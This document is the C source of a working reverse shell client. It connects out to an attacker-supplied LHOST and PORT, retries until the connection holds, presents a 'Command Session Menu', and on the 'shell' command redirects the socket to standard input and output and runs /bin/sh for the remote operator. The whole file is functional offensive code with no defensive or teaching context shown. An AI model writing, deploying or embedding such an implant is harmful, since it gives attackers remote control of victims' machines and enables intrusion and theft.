#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/wait.h>

#define MAXBUF 65536

int main(void){
  
  int connection_established;
  char ip[] = LHOST;
  int port = PORT;
  int n = 0;
  char buffer[MAXBUF];

  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);
  sa.sin_addr.s_addr = inet_addr(ip);
  
  int sockt =  socket(AF_INET, SOCK_STREAM, 0);
  do{
    connection_established = connect(sockt, (struct sockaddr *)&sa, sizeof(sa)); 
  }
  while(connection_established != 0);
  char* hello = "\n";
  write(sockt, hello, strlen(hello));
  
  while (connection_established == 0){
      while((n = read(sockt, buffer, MAXBUF)) > 0){
     	
      	if(strcmp(buffer, "help\n") == 0){
	  char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\n\n";

	  write(sockt, help, strlen(help));
	}
      	else if(strcmp(buffer, "shell\n") == 0){

	  int status = 0;
	  pid_t wpid, child_pid;
	  char* shell_msg = "\nStarting reverse shell session\n";
	  write(sockt, shell_msg, strlen(shell_msg));
          dup2(sockt, 0);
	  dup2(sockt, 1);
	  dup2(sockt, 2);
	  char *const argv[] = {"/bin/sh", NULL};
	  if((child_pid = fork()) == 0){
	  	execve("/bin/sh", argv, NULL);    // Create a child process and start shell inside of it
		exit(0);
     	  }
	  while ((wpid = wait(&status)) > 0);     // Make the parent process wait for child process to terminate
	
	  char* test_msg = "Exiting reverse shell session\n";  
	  write(sockt, test_msg, strlen(test_msg));
	}
	else{
	  char* invalid = "Invalid command session command, type \"help\" for a list of commands\n";		
	  write(sockt, invalid, strlen(invalid));
	}		
    }
   }
  
	return 0;
}